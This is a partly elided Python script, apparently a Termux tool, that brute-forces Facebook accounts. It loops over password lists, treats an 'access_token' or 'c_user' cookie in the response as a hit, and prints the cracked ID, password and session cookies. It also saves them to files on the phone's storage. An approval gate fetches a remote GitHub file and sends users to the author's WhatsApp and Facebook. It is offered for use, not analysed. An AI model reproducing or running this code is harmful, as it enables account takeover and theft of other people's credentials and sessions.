# OWNER BY SCRIPT : MR AKASH
# GITHUB LINK : MR-AKASH-VAIYA
# MACK BY : MR AKASH 
...
from concurrent.futures import ThreadPoolExecutor as MrAKASH
from string import * 
...
if 'print(url)' in file_content:
    ...
    os.system('pip install requests')
    exit(f'\033[1;32m[✓] \033[0;37m MR-AKASHTOOL.!')
...
bxd = ""
kex = bxd+id
myweb2 = requests.get("https://github.com/MR-AKASH-VAIYA/Apporve/blob/main/App.txt").text
def apv():
	try:
		clear()
		x = requests.get('https://github.com/MR-AKASH-VAIYA/Apporve/blob/main/App.txt').text
		if str("upppdate") in update:
			...
			clear()
			os.system('xdg-open https://www.facebook.com/AKASHarafat?mibextid=ZbWKwL')
			...
			os.system(f"termux-open-url https://wa.me/+8801310329198?text={kex}")  	
			apv()
...
logo=(f'''         
          \033[1;36m
Oo      oO `OooOOo.           Oo    `o    O     Oo    .oOOOo.  o      O 
O O    o o  o     `o         o  O    o   O     o  O   o     o  O      o 
o  o  O  O  O      O        O    o   O  O     O    o  O.       o      O 
O   Oo   O  o     .O       oOooOoOo  oOo     oOooOoOo  `OOoo.  OoOooOOo 
O        o  OOooOO'        o      O  o  o    o      O       `O o      O 
o        O  o    o         O      o  O   O   O      o        o O      o 
o        O  O     O        o      O  o    o  o      O O.    .O o      o 
O        o  O      o       O.     O  O     O O.     O  `oooO'  o      O 
                                                                                      
                                                        
\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m DEVELOPER ☞⁠￣⁠ᴥ⁠￣⁠☞ MR \033[1;33mAKASH
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m FACEBOOK  ☞⁠￣⁠ᴥ⁠￣⁠☞ MR AKASH TERMUX XONE
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m GITHUB    ☞⁠￣⁠ᴥ⁠￣⁠☞ MR-AKASH-404
...
def menu():
        try:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/AKASHarafat?mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[AKASH-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
    ...
    try:
        for pas in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r\r\r\033[1;32m[AKASH-OK]\033[1;33m {cid} | {pas}')
                        print(f'\r\r\033[1;36m[COKIES-🍪] {coki}');linex()
                        open('/sdcard/AKASH-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/AKASH-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r\r\r\033[1;32m[AKASH-OK]\033[1;36m {cid} | {pas}')
                        open('/sdcard/AKASH-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/AKASH-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            else:
